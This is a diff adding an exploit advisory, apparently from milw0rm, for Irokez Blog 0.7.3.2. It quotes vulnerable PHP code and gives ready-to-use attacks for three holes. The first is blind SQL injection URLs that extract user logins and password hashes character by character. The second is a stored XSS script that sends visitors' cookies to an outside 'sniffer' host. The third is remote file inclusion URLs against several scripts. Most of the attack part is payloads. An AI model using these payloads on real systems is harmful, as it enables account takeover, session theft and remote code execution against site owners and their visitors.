@@ -1,0 +1,91 @@
+================================================================================
+|| Irokez Blog BLIND SQL-INJECTION, INCLUDE, ACTIVE XSS
+================================================================================
+
+Application: Irokez Blog
+------------
+Website: http://irokez.org
+--------
+Version: All (0.7.3.2)
+--------
+Date: 11-02-2009
+-----
+
+[ BLIND SQL-INJECTION ]
+
+[ SOME VULNERABLE CODE ]
+
+/classes/table.class.php
+
+...
+if ($is_trans) {
+                $query = "select t.*, m.* from {$this->_name} m"
+                       . " left join {$this->_name}{$this->_trans} t on (t.{$this->_item} = m.id)"
+                       . " where m.id = '$id' group by {$this->_lang}";
+        	} else {
+                $query = "select * from {$this->_name} where id = '$id'";
+        	}
+            $result = $this->db->exeQuery($query);
+
+===>>> Exploit:
+
+http://irokez/blog/life/15' and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1)) between 100 and '115
+http://irokez/blog/life/15' and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1))='114
+etc
+
+[ ACTIVE XSS ]
+
+in comments.
+
+[ SOME VULNERABLE CODE ]
+
+/scripts/blog/output-post.inc.php
+
+ <input id="name" type="text" class="text" name="name" value="<?php echo $name?>" />
+                <label for="name"><?php echo $GLOBALS['LANG']['blog']['name']?></label>
+            </li>
+            <li>
+                <input id="email" type="text" class="text" name="email" value="<?php echo $email?>" />
+                <label for="email"><?php echo $GLOBALS['LANG']['blog']['email']?></label>
+            </li>
+            <li>
+                <input id="site" type="text" class="text" name="site" value="<?php echo $site?>" />
+                <label for="site"><?php echo $GLOBALS['LANG']['blog']['site']?></label>
+...
+ <textarea id="message" name="message" class="textarea"><?php echo $message?></xtextarea>
+
+===>>> Exploit:
+
+<script>img = new Image(); img.src = "http://sniffer/sniff.jpg?"+document.cookie;</script>
+
+[ INCLUDE ]
+
+[ SOME VULNERABLE CODE ]
+
+/thumbnail.php
+...
+ob_start();
+switch ($module) {
+    case 'gallery':
+        include_once $GLOBALS['PTH']['classes'] . 'gallery.class.php';
+        $Obj = new TBL_Gallery;
+        $image_path = $GLOBALS['PTH']['gallery'] . getVar($Obj->select($id), 'src');
+        break;
+    default:
+        $image_path = '';
+}
+
+===>>> Exploit:
+
+http://irokez/modules/tml/block.tag.php?GLOBALS[PTH][classes]=[include]
+http://irokez/scripts/sitemap.scr.php?GLOBALS[PTH][classes]=[include]
+http://irokez/thumbnail.php?module=gallery&GLOBALS[PTH][classes]=[include]
+http://irokez/spaw/spaw_control.class.php?GLOBALS[spaw_root]=[include]
+
+Author: Eugene "Corwin" Ermakov
+-------                                     
+	
+Contact: corwin88[dog]mail[dot]ru
+--------
+
+# milw0rm.com [2009-02-27]
